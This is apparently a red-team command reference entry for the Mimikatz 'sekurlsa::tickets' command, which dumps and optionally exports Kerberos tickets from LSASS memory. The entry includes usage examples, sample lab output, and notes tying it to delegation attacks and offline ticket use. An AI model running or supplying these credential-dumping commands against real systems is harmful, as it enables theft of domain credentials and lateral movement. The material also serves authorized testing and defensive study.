---
type: command
executor: bash
data: 'mimikatz # sekurlsa::tickets'
output: null
created_at: '2023-04-06T03:56:07.584914+00:00'
updated_at: '2023-04-10T20:25:48.071449+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - credential-access
verified: true
validated: true
---

# Mimikatz Extract Kerberos Tickets

## Command

```bash
mimikatz # sekurlsa::tickets
```

## Description

This Mimikatz command extracts all Kerberos tickets from the LSASS process memory, displaying details like user, service, and encryption type. It is essential for verifying ticket injection in delegation attacks or dumping tickets for offline use.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| sekurlsa::tickets | Module and action to list tickets | Yes |

## Examples

### Basic Usage

```bash
mimikatz # sekurlsa::tickets
```

### Advanced Usage (Export)

```bash
mimikatz # sekurlsa::tickets /export
```

## Expected Output

Ticket Listing:

User Name                : hacker
Domain                   : LAB.LOCAL
Logon Time               : ...
Service Name             : krbtgt/LAB.LOCAL
Client Name              : hacker
...

Lists all tickets; look for DC-targeted ones post-injection.

## Related

- [[Abuse Kerberos Unconstrained Delegation via SpoolService]]
- [[tools/Mimikatz]]
